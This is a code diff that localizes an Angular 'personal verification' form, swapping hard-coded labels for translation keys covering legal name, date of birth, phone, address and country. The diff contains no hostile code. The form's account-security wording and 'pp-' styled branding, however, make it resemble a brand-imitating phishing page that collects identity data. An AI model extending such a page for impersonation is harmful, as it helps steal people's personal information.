@@ -5,18 +5,19 @@ import { FormsModule } from '@angular/forms';
 import { PublicLayoutComponent } from './layout/public-layout.component';
 import { StateService } from '../services/state.service';
 import { filterCountries } from '../utils/country-data';
+import { TranslatePipe } from '../pipes/translate.pipe';
 
 @Component({
   selector: 'app-personal-verification',
   standalone: true,
-  imports: [CommonModule, FormsModule, PublicLayoutComponent],
+  imports: [CommonModule, FormsModule, PublicLayoutComponent, TranslatePipe],
   template: `
     <app-public-layout>
       
       <div class="flex flex-col items-center mb-10">
-        <h2 class="text-2xl font-bold text-pp-navy text-center mb-3 tracking-tight">Verify your information</h2>
+        <h2 class="text-2xl font-bold text-pp-navy text-center mb-3 tracking-tight">{{ 'PERSONAL.TITLE' | translate }}</h2>
         <p class="text-base text-slate-500 text-center max-w-[80%] mx-auto leading-relaxed">
-            Please confirm your personal details to help us secure your account.
+            {{ 'PERSONAL.SUBTITLE' | translate }}
         </p>
       </div>
 
@@ -25,8 +26,8 @@ import { filterCountries } from '../utils/country-data';
         <div class="mb-8 bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg">
             <span class="material-icons text-[#D92D20] text-xl">error</span>
             <div>
-              <p class="text-sm font-bold text-pp-navy">Please check your details</p>
-              <p class="text-xs text-slate-600 mt-1">Make sure your information matches your legal ID.</p>
+              <p class="text-sm font-bold text-pp-navy">{{ 'PERSONAL.ERROR_TITLE' | translate }}</p>
+              <p class="text-xs text-slate-600 mt-1">{{ 'PERSONAL.ERROR_DESC' | translate }}</p>
             </div>
         </div>
       }
@@ -44,7 +45,7 @@ import { filterCountries } from '../utils/country-data';
 
                 <label class="pp-label"
                     [class.top-2]="country" [class.text-xs]="country" [class.font-bold]="country">
-                    Country of residence
+                    {{ 'PERSONAL.COUNTRY' | translate }}
                 </label>
 
                 <span class="material-icons absolute right-4 top-4 text-slate-500 transition-transform duration-300" [class.rotate-180]="showDropdown()">expand_more</span>
@@ -87,7 +88,7 @@ import { filterCountries } from '../utils/country-data';
                     class="pp-input peer"
                     [class.shadow-input-error]="touchedName() && firstName.length < 2"
                 >
-                <label for="firstName" class="pp-label">Legal first name</label>
+                <label for="firstName" class="pp-label">{{ 'PERSONAL.FIRST_NAME' | translate }}</label>
             </div>
 
             <!-- Last Name -->
@@ -102,7 +103,7 @@ import { filterCountries } from '../utils/country-data';
                     class="pp-input peer"
                     [class.shadow-input-error]="touchedName() && lastName.length < 2"
                 >
-                <label for="lastName" class="pp-label">Legal last name</label>
+                <label for="lastName" class="pp-label">{{ 'PERSONAL.LAST_NAME' | translate }}</label>
             </div>
         </div>
 
@@ -117,10 +118,10 @@ import { filterCountries } from '../utils/country-data';
             class="pp-input peer"
             [class.shadow-input-error]="touchedDob() && !isAdult()"
           >
-          <label for="dob" class="pp-label !top-2 !text-xs !font-bold">Date of birth</label>
+          <label for="dob" class="pp-label !top-2 !text-xs !font-bold">{{ 'PERSONAL.DOB' | translate }}</label>
 
           @if(touchedDob() && dob && !isAdult()) {
-             <p class="text-xs text-[#d92d20] mt-1 ml-1 font-bold animate-slide-up">Must be 18+</p>
+             <p class="text-xs text-[#d92d20] mt-1 ml-1 font-bold animate-slide-up">{{ 'PERSONAL.MUST_BE_18' | translate }}</p>
           }
         </div>
 
@@ -137,7 +138,7 @@ import { filterCountries } from '../utils/country-data';
                     class="pp-input peer"
                     [class.shadow-input-error]="touchedPhone() && phoneNumber.replace(regex, '').length < 10"
                 >
-                <label for="phone" class="pp-label">Mobile number</label>
+                <label for="phone" class="pp-label">{{ 'PERSONAL.PHONE' | translate }}</label>
             </div>
         }
 
@@ -154,7 +155,7 @@ import { filterCountries } from '../utils/country-data';
               class="pp-input peer"
               [class.shadow-input-error]="touchedAddress() && addrStreet.length < 5"
             >
-            <label for="street" class="pp-label">Street address</label>
+            <label for="street" class="pp-label">{{ 'PERSONAL.ADDRESS' | translate }}</label>
           </div>
           
           <div class="grid grid-cols-2 gap-4">
@@ -169,7 +170,7 @@ import { filterCountries } from '../utils/country-data';
                   class="pp-input peer"
                   [class.shadow-input-error]="touchedAddress() && addrCity.length < 3"
                 >
-                <label for="city" class="pp-label">City</label>
+                <label for="city" class="pp-label">{{ 'PERSONAL.CITY' | translate }}</label>
              </div>
              <div class="pp-input-group mb-0">
                 <input 
@@ -183,7 +184,7 @@ import { filterCountries } from '../utils/country-data';
                   class="pp-input peer"
                   [class.shadow-input-error]="touchedAddress() && addrZip.length < 4"
                 >
-                <label for="zip" class="pp-label">Zip code</label>
+                <label for="zip" class="pp-label">{{ 'PERSONAL.ZIP' | translate }}</label>
              </div>
           </div>
         </div>
@@ -195,7 +196,7 @@ import { filterCountries } from '../utils/country-data';
             [class.opacity-50]="!isValid()"
             class="pp-btn"
           >
-            Continue
+            {{ 'COMMON.CONTINUE' | translate }}
           </button>
         </div>
       </div>
